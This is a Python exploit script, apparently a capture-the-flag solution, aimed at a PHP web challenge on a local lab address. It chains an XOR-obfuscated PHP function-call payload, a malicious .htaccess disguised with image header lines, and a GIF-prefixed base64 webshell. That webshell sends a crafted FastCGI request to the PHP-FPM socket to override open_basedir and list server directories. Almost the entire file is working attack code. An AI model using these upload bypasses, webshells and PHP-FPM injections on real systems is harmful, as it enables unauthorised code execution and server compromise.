import requests

url = "http://192.168.188.128:8810/"
payload = "?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag"
files = {'file':(".htaccess","""#define width 1
#define height 1
AddType application/x-httpd-php .pxp
php_value auto_append_file "php://filter/convert.base64-decode/resource=zenis.pxp""")}
r1 = requests.post(url+payload, files=files)
print(r1.text)
exp1 = """GIF89Tw/cGhwIAokZXhwID0gIkFRRlZnQUFJQUFBQUFRQUFBQUFBQUFFRVZZQUI3QUFBRVF0SFFWUkZWMEZaWDBsT1ZFVlNSa0ZEUlVaaGMzUkRSMGt2TVM0d0RnUlNSVkZWUlZOVVgwMUZWRWhQUkZCUFUxUVBGMU5EVWtsUVZGOUdTVXhGVGtGTlJTOTJZWEl2ZDNkM0wyaDBiV3d2YVc1a1pYZ3VjR2h3Q3hkVFExSkpVRlJmVGtGTlJTOTJZWEl2ZDNkM0wyaDBiV3d2YVc1a1pYZ3VjR2h3REFCUlZVVlNXVjlUVkZKSlRrY0xGMUpGVVZWRlUxUmZWVkpKTDNaaGNpOTNkM2N2YUhSdGJDOXBibVJsZUM1d2FIQU5BVVJQUTFWTlJVNVVYMUpQVDFRdkR3NVRSVkpXUlZKZlUwOUdWRmRCVWtWd2FIQXZabU5uYVdOc2FXVnVkQXNKVWtWTlQxUkZYMEZFUkZJeE1qY3VNQzR3TGpFTEJGSkZUVTlVUlY5UVQxSlVPVGs0TlFzSlUwVlNWa1ZTWDBGRVJGSXhNamN1TUM0d0xqRUxBbE5GVWxaRlVsOVFUMUpVT0RBTENWTkZVbFpGVWw5T1FVMUZiRzlqWVd4b2IzTjBEd2hUUlZKV1JWSmZVRkpQVkU5RFQweElWRlJRTHpFdU1Rd1FRMDlPVkVWT1ZGOVVXVkJGWVhCd2JHbGpZWFJwYjI0dmRHVjRkQTRDUTA5T1ZFVk9WRjlNUlU1SFZFZ3pNQWt3VUVoUVgxWkJURlZGWVhWMGIxOXdjbVZ3Wlc1a1gyWnBiR1VnUFNCd2FIQTZMeTlwYm5CMWRBcHZjR1Z1WDJKaGMyVmthWElnUFNBdkR4WlFTRkJmUVVSTlNVNWZWa0ZNVlVWaGJHeHZkMTkxY214ZmFXNWpiSFZrWlNBOUlFOXVBUVJWZ0FBQUFBQUJCVldBQUI0QUFEdy9jR2h3SUhCeWFXNTBYM0lvYzJOaGJtUnBjaWdpTHlJcEtUcy9QZ0VGVllBQUFBQUEiOwogICAgcHJpbnRfcigkZXhwKTsKICAgICRzb2NrPXN0cmVhbV9zb2NrZXRfY2xpZW50KCd1bml4Oi8vL3J1bi9waHAvcGhwNy4yLWZwbS5zb2NrJyk7CiAgICBzdHJlYW1fc29ja2V0X3NlbmR0bygkc29jaywgYmFzZTY0X2RlY29kZSgkZXhwKSk7CiAgICBwcmludCgiCiIpOwogICAgd2hpbGUoIWZlb2YoJHNvY2spKXsKICAgICAgICBwcmludF9yKGZyZWFkKCRzb2NrLCA0MDk2KSk7CiAgICB9CiAgICBmY2xvc2UoJHNvY2spOwo="""
exp = """GIF89Tw/cGhwIAokZXhwID0gIkFRRjZPQUFJQUFBQUFRQUFBQUFBQUFFRWVqZ0I3QUFBRVF0SFFWUkZWMEZaWDBsT1ZFVlNSa0ZEUlVaaGMzUkRSMGt2TVM0d0RnUlNSVkZWUlZOVVgwMUZWRWhQUkZCUFUxUVBGMU5EVWtsUVZGOUdTVXhGVGtGTlJTOTJZWEl2ZDNkM0wyaDBiV3d2YVc1a1pYZ3VjR2h3Q3hkVFExSkpVRlJmVGtGTlJTOTJZWEl2ZDNkM0wyaDBiV3d2YVc1a1pYZ3VjR2h3REFCUlZVVlNXVjlUVkZKSlRrY0xGMUpGVVZWRlUxUmZWVkpKTDNaaGNpOTNkM2N2YUhSdGJDOXBibVJsZUM1d2FIQU5BVVJQUTFWTlJVNVVYMUpQVDFRdkR3NVRSVkpXUlZKZlUwOUdWRmRCVWtWd2FIQXZabU5uYVdOc2FXVnVkQXNKVWtWTlQxUkZYMEZFUkZJeE1qY3VNQzR3TGpFTEJGSkZUVTlVUlY5UVQxSlVPVGs0TlFzSlUwVlNWa1ZTWDBGRVJGSXhNamN1TUM0d0xqRUxBbE5GVWxaRlVsOVFUMUpVT0RBTENWTkZVbFpGVWw5T1FVMUZiRzlqWVd4b2IzTjBEd2hUUlZKV1JWSmZVRkpQVkU5RFQweElWRlJRTHpFdU1Rd1FRMDlPVkVWT1ZGOVVXVkJGWVhCd2JHbGpZWFJwYjI0dmRHVjRkQTRDUTA5T1ZFVk9WRjlNUlU1SFZFZzBNZ2t3VUVoUVgxWkJURlZGWVhWMGIxOXdjbVZ3Wlc1a1gyWnBiR1VnUFNCd2FIQTZMeTlwYm5CMWRBcHZjR1Z1WDJKaGMyVmthWElnUFNBdkR4WlFTRkJmUVVSTlNVNWZWa0ZNVlVWaGJHeHZkMTkxY214ZmFXNWpiSFZrWlNBOUlFOXVBUVI2T0FBQUFBQUJCWG80QUNvQUFEdy9jR2h3SUhCeWFXNTBYM0lvYzJOaGJtUnBjaWduTDNaaGNpOTNkM2N2YUhSdGJDY3BLVHMvUGdFRmVqZ0FBQUFBIjsKICAgIHByaW50X3IoJGV4cCk7CiAgICAkc29jaz1zdHJlYW1fc29ja2V0X2NsaWVudCgndW5peDovLy9ydW4vcGhwL3BocDcuMi1mcG0uc29jaycpOwogICAgc3RyZWFtX3NvY2tldF9zZW5kdG8oJHNvY2ssIGJhc2U2NF9kZWNvZGUoJGV4cCkpOwogICAgcHJpbnQoIgoiKTsKICAgIHdoaWxlKCFmZW9mKCRzb2NrKSl7CiAgICAgICAgcHJpbnRfcihmcmVhZCgkc29jaywgNDA5NikpOwogICAgfQogICAgZmNsb3NlKCRzb2NrKTsK"""
files = {'file':("zenis.pxp",exp1)}
r2 = requests.post(url+payload, files=files)
print(r2.text)
print(requests.get(url+r2.text).text)
